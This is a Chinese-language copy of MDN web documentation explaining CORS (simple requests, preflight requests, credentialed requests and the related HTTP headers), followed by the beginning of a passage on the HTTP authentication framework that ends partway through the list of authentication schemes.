跨源域资源共享（[CORS](https://developer.mozilla.org/zh-CN/docs/Glossary/CORS)）机制允许 Web 应用服务器进行跨源访问控制，从而使跨源数据传输得以安全进行。现代浏览器支持在 API 容器中（例如 [`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 或 [Fetch](https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API)）使用 CORS，以降低跨源 HTTP 请求所带来的风险。

更具体地来讲，这篇文章适用于 **网站管理员**、**后端和前端开发者**。现代浏览器处理跨源资源共享的客户端部分，包括HTTP头和相关策略的执行。但是这一新标准意味着服务器需要处理新的请求头和响应头。

## [什么情况下需要 CORS ？](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#什么情况下需要_cors_？)

这份 [cross-origin sharing standard](https://fetch.spec.whatwg.org/#http-cors-protocol) 允许在下列场景中使用跨站点 HTTP 请求：

- 前文提到的由 [`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 或 [Fetch APIs](https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API) 发起的跨源 HTTP 请求。
- Web 字体 (CSS 中通过 `@font-face` 使用跨源字体资源)，[因此，网站就可以发布 TrueType 字体资源，并只允许已授权网站进行跨站调用](https://www.w3.org/TR/css-fonts-3/#font-fetching-requirements)。
- [WebGL 贴图](https://developer.mozilla.org/zh-CN/docs/Web/API/WebGL_API/Tutorial/Using_textures_in_WebGL)
- 使用 [`drawImage`](https://developer.mozilla.org/zh-CN/docs/Web/API/CanvasRenderingContext2D/drawImage) 将 Images/video 画面绘制到 canvas。
- [来自图像的 CSS 图形](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Shapes/Shapes_From_Images)

## [功能概述](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#功能概述)

跨源资源共享标准新增了一组 HTTP 首部字段，允许服务器声明哪些源站通过浏览器有权限访问哪些资源。另外，规范要求，对那些可能对服务器数据产生副作用的 HTTP 请求方法（特别是 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 以外的 HTTP 请求，或者搭配某些 [MIME类型](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types) 的 [`POST`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST) 请求），浏览器必须首先使用 [`OPTIONS`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS) 方法发起一个**预检请求**（preflight request），从而获知服务端是否允许该跨源请求。服务器确认允许之后，才发起实际的 HTTP 请求。在预检请求的返回中，服务器端也可以通知客户端，是否需要携带身份凭证（包括 [Cookies](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies) 和 [HTTP认证](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication) 相关数据）。

CORS 请求失败会产生错误，但是为了安全，在 JavaScript 代码层面是无法获知到底具体是哪里出了问题。**你只能查看浏览器的控制台以得知具体是哪里出现了错误。**

## [若干访问控制场景](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#若干访问控制场景)

这里，我们使用三个场景来解释跨源资源共享机制的工作原理。这些例子都使用 [`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 对象。

### [简单请求](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#简单请求)

某些请求不会触发 [CORS 预检请求](https://developer.mozilla.org/zh-CN/docs/Glossary/Preflight_request)。本文称这样的请求为“简单请求”，请注意，该术语并不属于 [Fetch](https://fetch.spec.whatwg.org/) （其中定义了 CORS）规范。若请求 **满足所有下述条件**，则该请求可视为“简单请求”：

- 使用下列方法之一：
  - [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET)
  - [`HEAD`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD)
  - [`POST`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST)
- 除了被用户代理自动设置的首部字段（例如 `Connection，`User-Agent`）和在 Fetch 规范中定义为禁用首部名称的其他首部，允许人为设置的字段为 Fetch 规范定义的对 CORS 安全的首部字段集合。该集合为：
  - [`Accept`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept)
  - [`Accept-Language`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language)
  - [`Content-Language`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Language)
  - [`Content-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type) （需要注意额外的限制）
- `Content-Type`的值仅限于下列三者之一：
  - `text/plain`
  - `multipart/form-data`
  - `application/x-www-form-urlencoded`
- 请求中的任意 [`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 对象均没有注册任何事件监听器；[`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 对象可以使用 [`XMLHttpRequest.upload`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/upload) 属性访问。
- 请求中没有使用 [`ReadableStream`](https://developer.mozilla.org/zh-CN/docs/Web/API/ReadableStream) 对象。

> **备注：** WebKit Nightly 和 Safari Technology Preview 为 [`Accept`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept), [`Accept-Language`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language), 和 [`Content-Language`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Language) 首部字段的值添加了额外的限制。如果这些首部字段的值是“非标准”的，WebKit/Safari 就不会将这些请求视为“简单请求”。

比如说，假如站点 `https://foo.example` 的网页应用想要访问 `https://bar.other` 的资源。`foo.example` 的网页中可能包含类似于下面的 JavaScript 代码：

```js
const xhr = new XMLHttpRequest();
const url = 'https://bar.other/resources/public-data/';

xhr.open('GET', url);
xhr.onreadystatechange = someHandler;
xhr.send();
```

客户端和服务器之间使用 CORS 首部字段来处理权限：

以下是浏览器发送给服务器的请求报文：

```http
GET /resources/public-data/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Connection: keep-alive
Origin: https://foo.example
```

请求首部字段 [`Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin) 表明该请求来源于 `http://foo.example`。

```http
HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 00:23:53 GMT
Server: Apache/2
Access-Control-Allow-Origin: *
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: application/xml

[XML Data]
```

本例中，服务端返回的 `Access-Control-Allow-Origin: *` 表明，该资源可以被 **任意** 外域访问。

```http
Access-Control-Allow-Origin: *
```

使用 [`Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin) 和 [`Access-Control-Allow-Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) 就能完成最简单的访问控制。如果服务端仅允许来自 `https://foo.example` 的访问，该首部字段的内容如下：

```
Access-Control-Allow-Origin: https://foo.example
```

> **备注：** 当响应的是[附带身份凭证的请求](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#附带身份凭证的请求)时，服务端 **必须** 明确 `Access-Control-Allow-Origin` 的值，而不能使用通配符“`*`”。

---

### [预检请求](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#预检请求)

与前述简单请求不同，“需预检的请求”要求必须首先使用 [`OPTIONS`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS) 方法发起一个预检请求到服务器，**以获知服务器是否允许该实际请求。**"预检请求“的使用，可以避免跨域请求对服务器的用户数据产生未预期的影响。

如下是一个需要执行预检请求的 HTTP 请求：

```js
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');

xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');

xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```



上面的代码使用 `POST` 请求发送一个 XML 文档，该请求包含了一个自定义的请求首部字段（X-PINGOTHER: pingpong）。另外，该请求的 `Content-Type` 为 `application/xml`。因此，该请求需要首先发起“预检请求”。

![img](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS/preflight_correct.png)

**备注：** 如下所述，实际的 `POST` 请求不会携带 `Access-Control-Request-*` 首部，它们仅用于 `OPTIONS` 请求。

下面是服务端和客户端完整的信息交互。首次交互是 *预检请求/响应*：

```http
OPTIONS /doc HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Connection: keep-alive
Origin: https://foo.example
Access-Control-Request-Method: POST
Access-Control-Request-Headers: X-PINGOTHER, Content-Type

HTTP/1.1 204 No Content
Date: Mon, 01 Dec 2008 01:15:39 GMT
Server: Apache/2
Access-Control-Allow-Origin: https://foo.example
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
Access-Control-Max-Age: 86400
Vary: Accept-Encoding, Origin
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
```

浏览器检测到，从 JavaScript 中发起的请求需要被预检。从上面的报文中，我们看到，第 1~10 行发送了一个使用 `OPTIONS` 方法 的“预检请求”。OPTIONS 是 HTTP/1.1 协议中定义的方法，**用以从服务器获取更多信息。该方法不会对服务器资源产生影响**。 预检请求中同时携带了下面两个首部字段：

```http
Access-Control-Request-Method: POST
Access-Control-Request-Headers: X-PINGOTHER, Content-Type
```

首部字段 [`Access-Control-Request-Method`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Request-Method) 告知服务器，实际请求将使用 POST 方法。首部字段 [`Access-Control-Request-Headers`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Request-Headers) 告知服务器，实际请求将携带两个自定义请求首部字段：`X-PINGOTHER` 与 `Content-Type`。服务器据此决定，该实际请求是否被允许。

第 13~22 行为预检请求的响应，表明服务器将接受后续的实际请求。重点看第 16~19 行：

```http
Access-Control-Allow-Origin: https://foo.example
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
Access-Control-Max-Age: 86400
```

服务器的响应携带了 `Access-Control-Allow-Origin: https://foo.example`，从而限制请求的源域。同时，携带的 `Access-Control-Allow-Methods` 表明服务器允许客户端使用 `POST` 和 `GET` 方法发起请求（与 [`Allow`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Allow) 响应首部类似，但其具有严格的访问控制）。

首部字段 `Access-Control-Allow-Headers` 表明服务器允许请求中携带字段 `X-PINGOTHER` 与 `Content-Type`。与 `Access-Control-Allow-Methods` 一样，`Access-Control-Allow-Headers` 的值为逗号分割的列表。

最后，首部字段 `Access-Control-Max-Age` 表明该响应的有效时间为 86400 秒，也就是 24 小时。在有效时间内，浏览器无须为同一请求再次发起预检请求。请注意，浏览器自身维护了一个 [最大有效时间](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Max-Age)，如果该首部字段的值超过了最大有效时间，将不会生效。

预检请求完成之后，发送实际请求：

```http
POST /doc HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Connection: keep-alive
X-PINGOTHER: pingpong
Content-Type: text/xml; charset=UTF-8
Referer: https://foo.example/examples/preflightInvocation.html
Content-Length: 55
Origin: https://foo.example
Pragma: no-cache
Cache-Control: no-cache

<person><name>Arun</name></person>

HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:15:40 GMT
Server: Apache/2
Access-Control-Allow-Origin: https://foo.example
Vary: Accept-Encoding, Origin
Content-Encoding: gzip
Content-Length: 235
Keep-Alive: timeout=2, max=99
Connection: Keep-Alive
Content-Type: text/plain

[Some XML payload]
```

#### 预检请求与重定向

并不是所有浏览器都支持预检请求的重定向。如果一个预检请求发生了重定向，一部分浏览器将报告错误：

CORS 最初要求浏览器具有该行为，不过在后续的 [修订](https://github.com/whatwg/fetch/commit/0d9a4db8bc02251cc9e391543bb3c1322fb882f2) 中废弃了这一要求。但并非所有浏览器都实现了这一变更，而仍然表现出最初要求的行为。

在浏览器的实现跟上规范之前，有两种方式规避上述报错行为：

- 在服务端去掉对预检请求的重定向；
- 将实际请求变成一个[简单请求](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#简单请求)。

如果上面两种方式难以做到，我们仍有其他办法：

1. 发出一个简单请求（使用 [Response.url](https://developer.mozilla.org/zh-CN/docs/Web/API/Response/url) 或 [XHR.responseURL](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/responseURL)）以判断真正的预检请求会返回什么地址。
2. 发出另一个请求（真正的请求），使用在上一步通过 [Response.url](https://developer.mozilla.org/zh-CN/docs/Web/API/Response/url) 或 [XMLHttpRequest.responseURL](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/responseURL) 获得的URL。

不过，如果请求是由于存在 `Authorization` 字段而引发了预检请求，则这一方法将无法使用。这种情况只能由服务端进行更改。

### [附带身份凭证的请求](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#附带身份凭证的请求)

**备注：** 当发出跨源请求时，第三方 cookie 策略仍将适用。无论如何改变本章节中描述的服务器和客户端的设置，该策略都会强制执行。

[`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 或 [Fetch](https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API) 与 CORS 的一个有趣的特性是，可以基于 [HTTP cookies](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies) 和 HTTP 认证信息发送身份凭证。一般而言，对于跨源 [`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 或 [Fetch](https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API) 请求，浏览器 **不会** 发送身份凭证信息。如果要发送凭证信息，需要设置 [`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 的某个特殊标志位。

本例中，`https://foo.example` 的某脚本向 `https://bar.other` 发起一个GET 请求，并设置 Cookies：

```javascript
const invocation = new XMLHttpRequest();
const url = 'https://bar.other/resources/credentialed-content/';

function callOtherDomain() {
  if (invocation) {
    invocation.open('GET', url, true);
    invocation.withCredentials = true;
    invocation.onreadystatechange = handler;
    invocation.send();
  }
}
```

第 7 行将 [`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 的 `withCredentials` 标志设置为 `true`，从而向服务器发送 Cookies。因为这是一个简单 `GET` 请求，所以浏览器不会对其发起“预检请求”。但是，如果服务器端的响应中未携带 [`Access-Control-Allow-Credentials`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials)`: true`，浏览器将不会把响应内容返回给请求的发送者。

![img](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS/cred-req-updated.png)

客户端与服务器端交互示例如下：

```http
GET /resources/credentialed-content/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Connection: keep-alive
Referer: https://foo.example/examples/credential.html
Origin: https://foo.example
Cookie: pageAccess=2

HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:34:52 GMT
Server: Apache/2
Access-Control-Allow-Origin: https://foo.example
Access-Control-Allow-Credentials: true
Cache-Control: no-cache
Pragma: no-cache
Set-Cookie: pageAccess=3; expires=Wed, 31-Dec-2008 01:34:53 GMT
Vary: Accept-Encoding, Origin
Content-Encoding: gzip
Content-Length: 106
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Content-Type: text/plain

[text/plain payload]
```

即使第 10 行指定了 Cookie 的相关信息，但是，如果 `https://bar.other` 的响应中缺失 [`Access-Control-Allow-Credentials`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials)`: true`（第 17 行），则响应内容不会返回给请求的发起者。

---

#### 预检请求和凭据

CORS 预检请求不能包含凭据。预检请求的 *响应* 必须指定 `Access-Control-Allow-Credentials: true` 来表明可以携带凭据进行实际的请求。

#### 附带身份凭证的请求与通配符

在响应附带身份凭证的请求时：

- 服务器不能将 `Access-Control-Allow-Origin` 的值设为通配符“`*`”，而应将其设置为特定的域，如：`Access-Control-Allow-Origin: https://example.com`。
- 服务器不能将 `Access-Control-Allow-Headers` 的值设为通配符“`*`”，而应将其设置为首部名称的列表，如：`Access-Control-Allow-Headers: X-PINGOTHER, Content-Type`
- 服务器不能将 `Access-Control-Allow-Methods` 的值设为通配符“`*`”，而应将其设置为特定请求方法名称的列表，如：`Access-Control-Allow-Methods: POST, GET`

对于附带身份凭证的请求（通常是 `Cookie`），服务器不得设置 `Access-Control-Allow-Origin` 的值为“`*`”。

这是因为请求的首部中携带了 `Cookie` 信息，如果 `Access-Control-Allow-Origin` 的值为“`*`”，请求将会失败。而将 `Access-Control-Allow-Origin` 的值设置为 `https://example.com`，则请求将成功执行。

另外，响应首部中也携带了 `Set-Cookie` 字段，尝试对 Cookie 进行修改。如果操作失败，将会抛出异常。

----

#### 第三方 cookies

注意在 CORS 响应中设置的 cookies 适用一般性第三方 cookie 策略。在上面的例子中，页面是在 `foo.example` 加载，但是第 20 行的 cookie 是被 `bar.other` 发送的，如果用户设置其浏览器拒绝所有第三方 cookies，那么将不会被保存。

请求中的 cookie（第 10 行）也可能在正常的第三方 cookie 策略下被阻止。因此，强制执行的 cookie 策略可能会使本节描述的内容无效（阻止你发出任何携带凭据的请求）。

Cookie 策略受 [SameSite](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie/SameSite) 属性控制。

---

## [HTTP 响应首部字段](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#http_响应首部字段)

本节列出了规范所定义的响应首部字段。上一小节中，我们已经看到了这些首部字段在实际场景中是如何工作的。

### [Access-Control-Allow-Origin](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#access-control-allow-origin)

响应首部中可以携带一个 [`Access-Control-Allow-Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) 字段，其语法如下：

```
Access-Control-Allow-Origin: <origin> | *
```

其中，origin 参数的值指定了允许访问该资源的外域 URI。对于不需要携带身份凭证的请求，服务器可以指定该字段的值为通配符，表示允许来自所有域的请求。

例如，下面的字段值将允许来自 `https://mozilla.org` 的请求：

```
Access-Control-Allow-Origin: https://mozilla.org
Vary: Origin
```

如果服务端指定了具体的域名而非“*”，那么响应首部中的 [`Vary`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary) 字段的值必须包含 [`Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin)。这将告诉客户端：服务器对不同的源站返回不同的内容。

### [Access-Control-Expose-Headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#access-control-expose-headers)

译者注：在跨源访问时，`XMLHttpRequest` 对象的 [`getResponseHeader()`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/getResponseHeader) 方法只能拿到一些最基本的响应头，Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma，如果要访问其他头，则需要服务器设置本响应头。

[`Access-Control-Expose-Headers`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Expose-Headers) 头让服务器把允许浏览器访问的头放入白名单，例如：

```
Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header
```

这样浏览器就能够通过 `getResponseHeader` 访问 `X-My-Custom-Header` 和 `X-Another-Custom-Header` 响应头了。

### [Access-Control-Max-Age](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#access-control-max-age)

[`Access-Control-Max-Age`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Max-Age) 头指定了preflight请求的结果能够被缓存多久，请参考本文在前面提到的preflight例子。

```
Access-Control-Max-Age: <delta-seconds>
```

`delta-seconds` 参数表示 preflight 预检请求的结果在多少秒内有效。

### [Access-Control-Allow-Credentials](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#access-control-allow-credentials)

[`Access-Control-Allow-Credentials`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials) 头指定了当浏览器的 `credentials` 设置为 true 时是否允许浏览器读取 response 的内容。当用在对 preflight 预检测请求的响应中时，它指定了实际的请求是否可以使用 `credentials`。请注意：简单 `GET` 请求不会被预检；如果对此类请求的响应中不包含该字段，这个响应将被忽略掉，并且浏览器也不会将相应内容返回给网页。

```
Access-Control-Allow-Credentials: true
```

### [Access-Control-Allow-Methods](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#access-control-allow-methods)

[`Access-Control-Allow-Methods`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Methods) 首部字段用于预检请求的响应。其指明了实际请求所允许使用的 HTTP 方法。

```
Access-Control-Allow-Methods: <method>[, <method>]*
```

### [Access-Control-Allow-Headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#access-control-allow-headers)

[`Access-Control-Allow-Headers`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Headers) 首部字段用于预检请求的响应。其指明了实际请求中允许携带的首部字段。

```
Access-Control-Allow-Headers: <field-name>[, <field-name>]*
```

## [HTTP 请求首部字段](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#http_请求首部字段)

本节列出了可用于发起跨源请求的首部字段。请注意，这些首部字段无须手动设置。 当开发者使用 XMLHttpRequest 对象发起跨源请求时，它们已经被设置就绪。

### [Origin](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#origin)

[`Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin) 首部字段表明预检请求或实际请求的源站。

```
Origin: <origin>
```

origin 参数的值为源站 URI。它不包含任何路径信息，只是服务器名称。

**备注：** 有时候将该字段的值设置为空字符串是有用的，例如，当源站是一个 data URL 时。

注意，在所有访问控制请求（Access control request）中，[`Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin) 首部字段 **总是** 被发送。

### [Access-Control-Request-Method](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#access-control-request-method)

[`Access-Control-Request-Method`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Request-Method) 首部字段用于预检请求。其作用是，将实际请求所使用的 HTTP 方法告诉服务器。

```
Access-Control-Request-Method: <method>
```

### [Access-Control-Request-Headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#access-control-request-headers)

[`Access-Control-Request-Headers`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Request-Headers) 首部字段用于预检请求。其作用是，将实际请求所携带的首部字段告诉服务器。

```
Access-Control-Request-Headers: <field-name>[, <field-name>]*
```

----

# HTTP 身份验证

HTTP 提供一个用于权限控制和认证的通用框架。最常用的HTTP认证方案是HTTP Basic authentication。本页介绍了通用的HTTP认证框架以及展示如何通过HTTP Basic authentication来限制权限访问您的服务器。

## [通用的 HTTP 认证框架](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication#通用的_http_认证框架)

[RFC 7235](https://datatracker.ietf.org/doc/html/rfc7235) 定义了一个 HTTP 身份验证框架，服务器可以用来针对客户端的请求发送 [challenge](https://developer.mozilla.org/zh-CN/docs/Glossary/challenge) （质询信息），客户端则可以用来提供身份验证凭证。质询与应答的工作流程如下：服务器端向客户端返回 [`401`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/401)（Unauthorized，未被授权的） 状态码，并在 [`WWW-Authenticate`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/WWW-Authenticate) 首部提供如何进行验证的信息，其中至少包含有一种质询方式。之后有意向证明自己身份的客户端可以在新的请求中添加 [`Authorization`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Authorization) 首部字段进行验证，字段值为身份验证凭证信息。通常客户端会弹出一个密码框让用户填写，然后发送包含有恰当的 `Authorization` 首部的请求。

![img](https://mdn.mozillademos.org/files/14689/HTTPAuth.png)

在上图所示的基本身份验证过程中，信息交换须通过 HTTPS(TLS) 连接来保证安全。

### [代理认证](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication#代理认证)

与上述同样的询问质疑和响应原理使用于代理认证。下面介绍一个中间代理需要认证的例子。资源认证和代理认证可以并存，区别于独立的头信息和响应状态码。代理认证，询问质疑的状态码是 [`407`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/407)（必须提供代理证书），响应头[`Proxy-Authenticate`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Proxy-Authenticate)至少包含一个可用的质制，并且请求头[`Proxy-Authorization`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Proxy-Authorization)用作提供证书给代理服务器。

### [访问拒绝](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication#访问拒绝)

当（代理）服务器收到一个合法认证信息时，若该认证不能获取请求资源的权限，（代理）服务器会返回[`403`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/403)响应状态，说明用户证书权限不够，与 [`401`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/401) 未认证和 [`407`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/407) 未代理认证不同。

### [跨域图片认证](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication#跨域图片认证)

一个被浏览器最近修复了的潜在的安全漏洞是跨域图片的认证。从 [Firefox 59](https://developer.mozilla.org/en-US/Firefox/Releases/59) 起，浏览器在加载不同域的图片资源时，将不会再弹出 HTTP 认证对话框（[bug 1423146](https://bugzilla.mozilla.org/show_bug.cgi?id=1423146)）。如果攻击者可以将任意图片嵌入到第三方页面中，禁止弹出 HTTP 认证对话框可避免用户的身份凭证被窃取。

### [HTTP 认证的字符编码](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication#http_认证的字符编码)

浏览器使用 `utf-8` 编码用户名和密码。Firefox 曾使用 `ISO-8859-1`，但为与其他浏览器保持一致改为 `utf-8`，也为了避免 [bug 1419658](https://bugzilla.mozilla.org/show_bug.cgi?id=1419658) 中所描述的潜在问题。

### [`WWW-Authenticate` 与 `Proxy-Authenticate` 首部](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication#www-authenticate_与_proxy-authenticate_首部)

[`WWW-Authenticate`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/WWW-Authenticate) 与 [`Proxy-Authenticate`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Proxy-Authenticate) 响应消息首部指定了为获取资源访问权限而进行身份验证的方法。它们需要明确要进行验证的方案，这样希望进行授权的客户端就知道该如何提供凭证信息。这两个首部的语法形式如下：

```
WWW-Authenticate: <type> realm=<realm>
Proxy-Authenticate: <type> realm=<realm>
```

在这里，<type> 指的是验证的方案（“基本验证方案”是最常见的验证方案，[会在下面进行介绍](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication#basic_authentication_scheme)）。realm 用来描述进行保护的区域，或者指代保护的范围。它可以是类似于 "Access to the staging site" 的消息，这样用户就可以知道他们正在试图访问哪一空间。

### [`Authorization` 与 `Proxy-Authorization` 首部](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication#authorization_与_proxy-authorization_首部)

[`Authorization`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Authorization) 与 [`Proxy-Authorization`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Proxy-Authorization) 请求消息首部包含有用来向（代理）服务器证明用户代理身份的凭证。这里同样需要指明验证的类型，其后跟有凭证信息，该凭证信息可以被编码或者加密，取决于采用的是哪种验证方案。

```
Authorization: <type> <credentials>
Proxy-Authorization: <type> <credentials>
```

### [验证方案](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication#验证方案)

通用 HTTP 身份验证框架可以被多个验证方案使用。不同的验证方案会在安全强度以及在客户端或服务器端软件中可获得的难易程度上有所不同。

最常见的验证方案是“基本验证方案”（"Basic"），该方案会在下面进行详细阐述。 IANA 维护了[一系列的验证方案](https://www.iana.org/assignments/http-authschemes/http-authschemes.xhtml)，除此之外还有其他类型的验证方案由虚拟主机服务提供，例如 Amazon AWS 。常见的验证方案包括：

- **Basic** (查看 [RFC 7617](https://datatracker.ietf.org/doc/html/rfc7617), base64编码凭证. 详情请参阅下文.),
